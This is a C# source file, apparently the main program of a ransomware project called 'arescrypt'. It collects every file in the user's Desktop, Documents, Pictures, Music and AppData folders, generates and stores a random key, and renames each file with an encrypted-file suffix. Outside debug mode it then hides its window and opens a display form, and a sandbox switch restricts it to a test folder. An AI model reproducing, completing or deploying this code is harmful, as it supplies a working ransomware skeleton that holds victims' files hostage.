using System;
using System.IO;
using System.Windows.Forms;
using System.Collections.Generic;

namespace arescrypt
{
    class Program
    {
        // Predefinitions
        public static string sessionDomain = Environment.UserDomainName; // get current sessions domain
        public static string sessionUsername = Environment.UserName; // get current sessions username
        static Configuration config = new Configuration(); // New instance of Configuration class
        static Cryptography crypto = new Cryptography(); // New instance of Cryptography class

        static void Main(string[] args)
        {
            // Welcome message
            Console.Write("Hello, " + sessionDomain + @"\" + sessionUsername);
#if DEBUG
            Console.Write(". DEBUG mode has been enabled.\n");
#else
            Console.Write(". RELEASE mode has been enabled.\n");
#endif
            Console.WriteLine("Current path is: " + Configuration.currentWorkingDirectory + "\n");
            // End welcome message

            var userSpecificDirs = new List<string> { "" };
            string[] fullFileIndex = { "" };


            if (config.sandBox) // == true
                if (Directory.Exists(config.sandBoxDirectory))
                    userSpecificDirs.Add(config.sandBoxDirectory);
                else
                    Console.WriteLine("Sandbox mode was enabled, but no sandbox directory was discovered.\nPlease create this directory: " + config.sandBoxDirectory);
            else if (!config.sandBox)
            {
                // User specific directories, administrative rights shouldn't be required in order to write to these files
                userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
                userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments));
                userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
                userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic));
                userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
            }
            
            var userSpecificFiles = new List<string> { };
            var systemSpecificFiles = new List<string> { };

            // Get all files in every directory specified above.
            // Then add to a List<string> (array)
            foreach (string dir in userSpecificDirs)
                foreach (string file in FileHandler.DirSearch(dir))
                    userSpecificFiles.Add(file);
            fullFileIndex = userSpecificFiles.ToArray();
            
            /* BEGIN ENCRYPTION/DECRYPTION SECTION */
            string encKey = crypto.genRandomString(0xC);
            config.uniqueKey = encKey;
            Console.WriteLine("Generated unique id: " + encKey + "\n");

            Config conf = new Config();
            conf.uniqueKey = encKey;

            Misc.SetDATFileData(conf);
            Misc.DisplayDATFileData();

            Cryptography.executeExample(); // Execute cryptography example

            // Code for operation to run on all discovered files.
            // Remember, application may not have read/write access to all files.
            foreach (string file in fullFileIndex)
            {
                if (FileHandler.appendSuffixToFile(config.encryptedFileSuffix, file))
                    Console.WriteLine("File, " + file + ", was renamed successfully.");
            }

            /* END ENCRYPTION/DECRYPTION SECTION */
            
            // Giving "Debug Mode" switch in Configuration it's usability
            if (config.debugMode) // == true
            {
                // Exiting message
                Console.Write("\nPress any key to continue . . . ");

                try { Console.ReadKey(); } // Hang the console
                catch (Exception) { } // Because Mintty doesn't like to "ReadKeys"
            }
            else if (!config.debugMode) // == false
            {
                Misc.HideWindow();
                Application.EnableVisualStyles();
                Application.SetCompatibleTextRenderingDefault(false);
                Application.Run(new Display());
            }
        }
    }
}
